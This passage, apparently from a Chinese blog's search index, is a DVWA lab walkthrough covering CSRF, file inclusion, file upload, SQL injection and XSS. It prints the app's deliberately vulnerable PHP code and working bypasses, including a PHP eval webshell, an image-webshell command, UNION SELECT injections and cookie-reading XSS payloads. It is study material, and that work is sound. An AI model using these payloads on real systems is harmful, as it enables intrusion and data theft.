\"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $current_user = dvwaCurrentUser(); $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . $current_user . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); // Feedback for the user echo \"\u003cpre\u003ePassword Changed.\u003c/pre\u003e\"; } else { // Issue with passwords matching echo \"\u003cpre\u003ePasswords did not match.\u003c/pre\u003e\"; } } else { // Didn't come from a trusted source echo \"\u003cpre\u003eThat request didn't look correct.\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?\u003e 上述添加了对数据包中的Referer字段进行校验.只要Referer字段中含’SERVER_NAME’(本地即127.0.0.1)即可绕过. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:4:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php $change = false; $request_type = \"html\"; $return_message = \"Request Failed\"; if ($_SERVER['REQUEST_METHOD'] == \"POST\" \u0026\u0026 array_key_exists (\"CONTENT_TYPE\", $_SERVER) \u0026\u0026 $_SERVER['CONTENT_TYPE'] == \"application/json\") { $data = json_decode(file_get_contents('php://input'), true); $request_type = \"json\"; if (array_key_exists(\"HTTP_USER_TOKEN\", $_SERVER) \u0026\u0026 array_key_exists(\"password_new\", $data) \u0026\u0026 array_key_exists(\"password_conf\", $data) \u0026\u0026 array_key_exists(\"Change\", $data)) { $token = $_SERVER['HTTP_USER_TOKEN']; $pass_new = $data[\"password_new\"]; $pass_conf = $data[\"password_conf\"]; $change = true; } } else { if (array_key_exists(\"user_token\", $_REQUEST) \u0026\u0026 array_key_exists(\"password_new\", $_REQUEST) \u0026\u0026 array_key_exists(\"password_conf\", $_REQUEST) \u0026\u0026 array_key_exists(\"Change\", $_REQUEST)) { $token = $_REQUEST[\"user_token\"]; $pass_new = $_REQUEST[\"password_new\"]; $pass_conf = $_REQUEST[\"password_conf\"]; $change = true; } } if ($change) { // Check Anti-CSRF token checkToken( $token, $_SESSION[ 'session_token' ], 'index.php' ); // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = mysqli_real_escape_string ($GLOBALS[\"___mysqli_ston\"], $pass_new); $pass_new = md5( $pass_new ); // Update the database $current_user = dvwaCurrentUser(); $insert = \"UPDATE `users` SET password = '\" . $pass_new . \"' WHERE user = '\" . $current_user . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ); // Feedback for the user $return_message = \"Password Changed.\"; } else { // Issue with passwords matching $return_message = \"Passwords did not match.\"; } mysqli_close($GLOBALS[\"___mysqli_ston\"]); if ($request_type == \"json\") { generateSessionToken(); header (\"Content-Type: application/json\"); print json_encode (array(\"Message\" =\u003e$return_message)); exit; } else { echo \"\u003cpre\u003e\" . $return_message . \"\u003c/pre\u003e\"; } } // Generate Anti-CSRF token generateSessionToken(); ?\u003e 上述调用checkToken进行了Token校验.当用户访问改密页面时,服务器会返回一个随机的Token,向服务器发起请求时,需要提交Token参数.而服务器在收到请求时,也会检查Token,当Token正确时,才会处理客户端的请求. 当网站添加了Token校验时,很难进行CSRF利用. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:4:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"文件包含 当服务器开启allow_url_include选项时,可以通过php的某些特性函数include(),require(),include_once(),require_once()利用url去动态包含文件,导致任意文件读取或任意命令执行. 文件包含分为两种:本地文件包含和远程文件包含(allow_url_fopen). ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:5:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php // The page we wish to display $file = $_GET[ 'page' ]; ?\u003e 没有对Page参数做任何过滤和防护,在用户对url进行传参时不管page=? 都会被服务器当成php来执行,所以造成任意文件读取和任意命令执行. 可以利用报错获取路径信息 伪造路径查看文件 http://127.0.0.1/dvwa/vulnerabilities/fi/?page=D:\\phpStudy 8.1.0.1\\WWW\\DVWA\\phpinfo.php ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:5:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation $file = str_replace( array( \"http://\", \"https://\" ), \"\", $file ); $file = str_replace( array( \"../\", \"..\\\\\" ), \"\", $file ); ?\u003e 上述对http https进行处理,主要是针对远程文件包含.但是存在双写绕过,?page=hhttp://ttp://ip/可执行脚本 对../ ..\\进行处理,主要是针对相对路径,但是对绝对路径来说没什么影响. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:5:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php // The page we wish to display $file = $_GET[ 'page' ]; // Input validation if( !fnmatch( \"file*\", $file ) \u0026\u0026 $file != \"include.php\" ) { // This isn't the page we want! echo \"ERROR: File not found!\"; exit; } ?\u003e 上述要求file类型地址,只需在地址前加file:// 即可. http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file://D:\\phpStudy 8.1.0.1\\WWW\\DVWA\\phpinfo.php ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:5:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"文件上传 Web应用中对于上传文件的功能没有进行严格的验证和过滤,导致攻击者可以上传任意文件.例如,一句话木马(WebShell)控制整个网站. 下述使用的WebShell如下: \u003c?php @eval($_POST['123456']);?\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:6:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '\u003cpre\u003eYour image was not uploaded.\u003c/pre\u003e'; } else { // Yes! echo \"\u003cpre\u003e{$target_path} succesfully uploaded!\u003c/pre\u003e\"; } } ?\u003e 不对上传文件进行任何检测. 文件上传 蚁剑连接 http://127.0.0.1/dvwa/hackable/uploads/shell.php ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:6:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) \u0026\u0026 ( $uploaded_size \u003c 100000 ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) { // No echo '\u003cpre\u003eYour image was not uploaded.\u003c/pre\u003e'; } else { // Yes! echo \"\u003cpre\u003e{$target_path} succesfully uploaded!\u003c/pre\u003e\"; } } else { // Invalid file echo '\u003cpre\u003eYour image was not uploaded. We can only accept JPEG or PNG images.\u003c/pre\u003e'; } } ?\u003e 对上传文件后缀进行检测 BurpSuite抓包修改文件类型 蚁剑连接 http://127.0.0.1/dvwa/hackable/uploads/shell.php ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:6:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php if( isset( $_POST[ 'Upload' ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) \u0026\u0026 ( $uploaded_size \u003c 100000 ) \u0026\u0026 getimagesize( $uploaded_tmp ) ) { // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) { // No echo '\u003cpre\u003eYour image was not uploaded.\u003c/pre\u003e'; } else { // Yes! echo \"\u003cpre\u003e{$target_path} succesfully uploaded!\u003c/pre\u003e\"; } } else { // Invalid file echo '\u003cpre\u003eYour image was not uploaded. We can only accept JPEG or PNG images.\u003c/pre\u003e'; } } ?\u003e 对上传文件头进行检测. 生成图片马,使用下述命令将WebShell附加到图片末尾 copy a.png/b + shell.php/b c.png 将上述图片马进行上传 利用文件包含漏洞 http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file://D:/phpStudy%208.1.0.1/WWW/DVWA/hackable/uploads/c.png 蚁剑连接 http://127.0.0.1/dvwa/vulnerabilities/fi/?page=file://D:/phpStudy 8.1.0.1/WWW/DVWA/hackable/uploads/c.png 上述连接会失败,因为蚁剑缺少cookie. 将上述数据进行添加,点击浏览网站. Dvwa默认安全等级为impossible,将其修改为high,并保存. 此时再去连接,就可以成功. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:6:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"SQL注入 通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串,最终达到欺骗服务器执行恶意的SQL命令. 产生SQL注入的两个条件: 用户能够控制输入. 服务端程序执行的SQL语句拼接了用户输入的数据. SQL盲注:常规的SQL注入在输入SQL语句后,会返回SQL执行的结果.但是SQL盲注不会将执行结果显示出来,只会告诉你\"对\"还是\"不对\",不会出现回显现象. 通用流程如下: 判断是否存在注入,注入是字符型还是数字型. 猜解SQL查询语句中的字段数. 确定显示的字段顺序. 获取当前数据库. 获取数据库中的表. 获取表中的字段名. 下载数据. 常用语句如下: 获取库名 union select 1,database()# 获取表名 #Illegal mix of collations for operation 'UNION' #如果报上述错误,就在 from 前加 COLLATE utf8_general_ci union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 获取列名 #Illegal mix of collations for operation 'UNION' #如果报上述错误,就在 from 前加 COLLATE utf8_general_ci union select 1,group_concat(column_name) from information_schema.columns where table_name='users'# ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:7:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php if( isset( $_REQUEST[ 'Submit' ] ) ) { // Get input $id = $_REQUEST[ 'id' ]; switch ($_DVWA['SQLI_DB']) { case MYSQL: // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } mysqli_close($GLOBALS[\"___mysqli_ston\"]); break; case SQLITE: global $sqlite_db_connection; #$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']); #$sqlite_db_connection-\u003eenableExceptions(true); $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\"; #print $query; try { $results = $sqlite_db_connection-\u003equery($query); } catch (Exception $e) { echo 'Caught exception: ' . $e-\u003egetMessage(); exit(); } if ($results) { while ($row = $results-\u003efetchArray()) { // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } } else { echo \"Error in fetch \".$sqlite_db-\u003elastErrorMsg(); } break; } } ?\u003e 对用户输入的内容未做判断,直接进行SQL拼接. 可以利用下述语句获取库名: 1' union select 1,database()# ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:7:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $id = $_POST[ 'id' ]; $id = mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $id); switch ($_DVWA['SQLI_DB']) { case MYSQL: $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query) or die( '\u003cpre\u003e' . mysqli_error($GLOBALS[\"___mysqli_ston\"]) . '\u003c/pre\u003e' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Display values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } break; case SQLITE: global $sqlite_db_connection; $query = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\"; #print $query; try { $results = $sqlite_db_connection-\u003equery($query); } catch (Exception $e) { echo 'Caught exception: ' . $e-\u003egetMessage(); exit(); } if ($results) { while ($row = $results-\u003efetchArray()) { // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } } else { echo \"Error in fetch \".$sqlite_db-\u003elastErrorMsg(); } break; } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query = \"SELECT COUNT(*) FROM users;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); $number_of_rows = mysqli_fetch_row( $result )[0]; mysqli_close($GLOBALS[\"___mysqli_ston\"]); ?\u003e 利用mysqli_real_escape_string函数,对用户输入内容进行转义. 可以使用BurpSuite修改发送的数据如下,来获取库名. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:7:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php if( isset( $_SESSION [ 'id' ] ) ) { // Get input $id = $_SESSION[ 'id' ]; switch ($_DVWA['SQLI_DB']) { case MYSQL: // Check database $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003eSomething went wrong.\u003c/pre\u003e' ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); break; case SQLITE: global $sqlite_db_connection; $query = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\"; #print $query; try { $results = $sqlite_db_connection-\u003equery($query); } catch (Exception $e) { echo 'Caught exception: ' . $e-\u003egetMessage(); exit(); } if ($results) { while ($row = $results-\u003efetchArray()) { // Get values $first = $row[\"first_name\"]; $last = $row[\"last_name\"]; // Feedback for end user echo \"\u003cpre\u003eID: {$id}\u003cbr /\u003eFirst name: {$first}\u003cbr /\u003eSurname: {$last}\u003c/pre\u003e\"; } } else { echo \"Error in fetch \".$sqlite_db-\u003elastErrorMsg(); } break; } } ?\u003e 添加了 LIMIT 1,可以使用#注释掉后续内容.同Low ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:7:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"XSS XSS全称Cross Site Scripting,即跨站脚本攻击.它允许攻击者向网站注入恶意客户端代码,当受害者运行这些恶意代码时,攻击者就可以突破网站的访问限制并冒充受害者. XSS根据不同的攻击形式,分为以下三种: 攻击载体 攻击者角色 DOM型XSS 目标网站的DOM元素被恶意修改 普通用户 反射型XSS 攻击者制作的网页或链接 能够诱发受害者打开某个网页的人员 存储型XSS 攻击者与受害者共同使用的Web应用 要攻击网站的用户 ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:8:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"DOM型XSS ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:9:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php # No protections, anything goes ?\u003e 服务端没有PHP代码进行处理,直接在url后构造即可. http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English\u003cscript\u003ealert(document.cookie)\u003c/script\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:9:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { $default = $_GET['default']; # Do not allow script tags if (stripos ($default, \"\u003cscript\") !== false) { header (\"location: ?default=English\"); exit; } } ?\u003e 可以看到服务端做了限制,不允许出现script标签. 可以在url后加#,#后面的数据不会发送到服务端. http://127.0.0.1/dvwa/vulnerabilities/xss_d/#?default=English\u003cscript\u003ealert(document.cookie)\u003c/script\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:9:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php // Is there any input? if ( array_key_exists( \"default\", $_GET ) \u0026\u0026 !is_null ($_GET[ 'default' ]) ) { # White list the allowable languages switch ($_GET['default']) { case \"French\": case \"English\": case \"German\": case \"Spanish\": # ok break; default: header (\"location: ?default=English\"); exit; } } ?\u003e 同Medium在url后加# ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:9:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"反射型XSS ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:10:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) \u0026\u0026 $_GET[ 'name' ] != NULL ) { // Feedback for end user echo '\u003cpre\u003eHello ' . $_GET[ 'name' ] . '\u003c/pre\u003e'; } ?\u003e 输入的XSS内容如下: \u003cscript\u003ealert(document.cookie)\u003c/script\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:10:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) \u0026\u0026 $_GET[ 'name' ] != NULL ) { // Get input $name = str_replace( '\u003cscript\u003e', '', $_GET[ 'name' ] ); // Feedback for end user echo \"\u003cpre\u003eHello {$name}\u003c/pre\u003e\"; } ?\u003e 将输入内容的script替换为空字符. 输入的XSS内容如下: 双写绕过 \u003cscr\u003cscript\u003eipt\u003ealert(document.cookie)\u003c/script\u003e 大小写绕过 \u003cSCRIPT\u003ealert(document.cookie)\u003c/SCRIPT\u003e 使用非script标签 \u003cimg src=1 onerror='alert(document.cookie)'\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:10:2","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"High 服务端源码如下: \u003c?php header (\"X-XSS-Protection: 0\"); // Is there any input? if( array_key_exists( \"name\", $_GET ) \u0026\u0026 $_GET[ 'name' ] != NULL ) { // Get input $name = preg_replace( '/\u003c(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"\u003cpre\u003eHello {$name}\u003c/pre\u003e\"; } ?\u003e 对输入内容进行正则过滤,可使用非script标签绕过 \u003cimg src=1 onerror='alert(document.cookie)'\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:10:3","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"存储型XSS 可以将构造的XSS语句写入存储到服务器中. ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:11:0","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Low 服务端源码如下: \u003c?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitize name input $name = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '\u003cpre\u003e' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u003c/pre\u003e' ); //mysql_close(); } ?\u003e 输入的XSS内容如下: \u003cscript\u003ealert(document.cookie)\u003c/script\u003e ","date":"2024-06-10","objectID":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/:11:1","tags":["Web安全"],"title":"DVWA通关记录","uri":"/posts/web%E5%AE%89%E5%85%A8/dvwa%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"},{"categories":["Web安全"],"content":"Medium 服务端源码如下: \u003c?php if( isset( $_POST[ 'btnSign' ] ) ) { // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = strip_tags( addslashes( $message ) ); $message = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $message ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $message = htmlspecialchars( $message ); // Sanitize name input $name = str_replace( '\u003cscript\u003e', '', $name ); $name = ((isset($GLOBALS[\"___mysqli_ston\"]) \u0026\u0026 is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $name ) : 